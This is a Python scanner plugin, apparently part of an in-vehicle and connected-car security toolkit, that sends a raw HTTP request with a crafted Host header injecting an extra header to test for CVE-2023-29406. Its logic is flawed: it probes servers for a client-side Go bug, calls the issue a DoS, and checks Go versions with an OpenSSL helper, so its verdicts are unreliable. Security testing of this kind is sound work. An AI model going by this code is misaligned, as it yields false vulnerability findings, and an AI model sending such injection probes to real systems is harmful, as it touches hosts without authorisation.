#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import re
import socket
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from probe_utils import (
    tls_get_server_info, detect_openssl_version,
    openssl_version_affected, detection_confidence,
    score_probe_result, service_open, HTTPProbe,
)


VULN = {
    "id": 91,
    "cve": "CVE-2023-29406",
    "year": 2023,
    "domain": "车载OS依赖库",
    "vendor_product": "Go stdlib in backend/edge",
    "component": "HTTP/1 client",
    "type": "资源消耗/DoS",
    "summary": "车联网后端/边缘服务依赖Go时需排查的DoS。",
    "source_description": "The HTTP/1 client does not fully validate the contents of the Host header. A maliciously crafted Host header can inject additional headers or entire requests. With fix, the HTTP/1 client now refuses to send requests containing an invalid Request.Host or Request.URL.Host value.",
    "poc_status": "有公开PoC",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29406",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-29406",
        "https://go.dev/issue/60374",
        "https://go.dev/cl/506996",
        "https://groups.google.com/g/golang-announce/c/2q13H6LEEx0",
        "https://pkg.go.dev/vuln/GO-2023-1878",
        "https://security.netapp.com/advisory/ntap-20230814-0002/",
        "https://security.gentoo.org/glsa/202311-09",
        "https://cveawg.mitre.org/api/cve/CVE-2023-29406"
    ],
    "affected": [
        {
            "vendor": "Go standard library",
            "product": "net/http",
            "versions": [
                {"version": "1.20.0", "status": "affected", "lessThan": "1.20.6", "versionType": "semver"},
                {"version": "0", "status": "affected", "lessThan": "1.19.11", "versionType": "semver"},
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-29406",
        "stdlib",
        "backend",
        "edge",
        "HTTP",
        "client",
        "DoS",
        "does",
        "fully",
        "validate",
        "contents",
        "Host",
        "header",
        "maliciously",
        "crafted",
        "inject",
        "additional",
        "headers",
        "entire",
        "requests",
        "refuses",
        "send",
        "containing",
        "invalid",
        "Request.Host",
        "Request.URL.Host",
        "value",
        "Go standard library",
        "net/http"
    ]
}


def _probe_host_header_injection(host: str, port: int) -> dict:
    """Send crafted Host header with embedded newline to test for Go HTTP injection.

    CVE-2023-29406: unpatched Go servers will forward the crafted Host header
    in redirect Location responses. Patched servers reject the request outright.
    """
    result = {}
    try:
        # Craft a Host header with embedded space + injected header (CRLF injection attempt)
        malicious_host = f"{host} X-Injected: evil-value"
        raw_req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {malicious_host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        with socket.create_connection((host, port), timeout=6) as sock:
            sock.sendall(raw_req)
            resp_bytes = b""
            while True:
                chunk = sock.recv(2048)
                if not chunk:
                    break
                resp_bytes += chunk
                if len(resp_bytes) > 8192:
                    break
        resp = resp_bytes.decode(errors="replace")
        result["host_injection_response_snippet"] = resp[:400]

        # Check if "X-Injected" appears in Location header (indicator of unpatched server)
        location_match = re.search(r"Location:\s*(.+)", resp, re.IGNORECASE)
        if location_match:
            location = location_match.group(1)
            result["location_header"] = location
            if "evil-value" in location or "X-Injected" in location:
                result["host_injection_reflected"] = True

        # Check for 400 Bad Request (patched server rejects invalid Host)
        if resp.startswith("HTTP/1.1 400") or resp.startswith("HTTP/1.0 400"):
            result["server_rejected_invalid_host"] = True

        # Extract Server header
        server_match = re.search(r"Server:\s*(.+)", resp, re.IGNORECASE)
        if server_match:
            result["server_header"] = server_match.group(1).strip()

    except Exception as exc:
        result["probe_error"] = str(exc)
    return result


def _detect_go_version(server_header: str) -> str | None:
    """Extract Go version from server header string."""
    m = re.search(r"go(?:lang)?[/ ]?(\d+\.\d+(?:\.\d+)?)", server_header, re.IGNORECASE)
    return m.group(1) if m else None


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    cve = "CVE-2023-29406"

    evidence = {
        "cve": cve,
        "target": f"{target_ip}:{port}",
        "technique": "Go server detection + Host header injection probe + semantic version comparison",
        "reference": "https://go.dev/issue/60374",
    }

    if not service_open(target_ip, port):
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }
    evidence["service_open"] = True

    # Step 1: TLS fingerprinting if HTTPS
    if port in (443, 8443):
        tls_info = tls_get_server_info(target_ip, port)
        evidence.update({k: v for k, v in tls_info.items() if v})

    # Step 2: Host header injection probe
    injection_result = _probe_host_header_injection(target_ip, port)
    evidence.update({k: v for k, v in injection_result.items() if v})

    # Step 3: Detect Go version from server header
    server_header = injection_result.get("server_header", "")
    go_version = _detect_go_version(server_header)
    evidence["detected_go_version"] = go_version
    evidence["go_server_detected"] = bool(go_version or "go" in server_header.lower())

    # Step 4: Version comparison
    if go_version:
        affected = openssl_version_affected(go_version, cve)
        evidence["version_in_affected_range"] = affected
        evidence["detection_level"] = "C"

        if affected is True:
            vulnerable = True
            conf = detection_confidence("C", evidence, "tls_fingerprint+version_range")
        elif affected is False:
            vulnerable = False
            conf = detection_confidence("C", evidence, "tls_fingerprint+version_range")
        else:
            # Behavioral signal: if injection was reflected, likely vulnerable
            if injection_result.get("host_injection_reflected"):
                vulnerable = True
                conf = detection_confidence("B", evidence, "host_injection_reflected")
            elif injection_result.get("server_rejected_invalid_host"):
                vulnerable = False
                conf = detection_confidence("C", evidence, "server_rejected_injection")
            else:
                vulnerable = None
                conf = detection_confidence("E", evidence, "tls_fingerprint_only")
    elif not evidence["go_server_detected"]:
        evidence["note"] = "Go HTTP server not detected on target"
        vulnerable = False
        conf = detection_confidence("E", evidence, "no_go_server")
    else:
        evidence["version_detection"] = "failed - Go version not visible in server header"
        evidence["detail"] = (
            f"Go server detected but version not extractable from header. "
            f"Server: {server_header}. "
            f"Manual check: curl -v http://{target_ip}:{port}/ 2>&1 | grep -i server"
        )
        # Behavioral fallback
        if injection_result.get("host_injection_reflected"):
            vulnerable = True
            conf = detection_confidence("B", evidence, "host_injection_reflected")
        else:
            vulnerable = None
            conf = detection_confidence("E", evidence, "tls_fingerprint_only")

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "detection_confidence": conf,
        "requires_manual_review": vulnerable is None,
    }


class Poc56CVE202329406DoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-056"
    meta_poc_name = 'CVE-2023-29406 DoS Active Validation'
    meta_cve_id = 'CVE-2023-29406'
    meta_severity = 'Medium'
    meta_protocol = 'http'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-29406'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-29406']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "56_Go_HTTP_Client_Resource_Exhaustion_DoS_Audit") if "VULN" in dir() else "56_Go_HTTP_Client_Resource_Exhaustion_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc56CVE202329406DoSAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
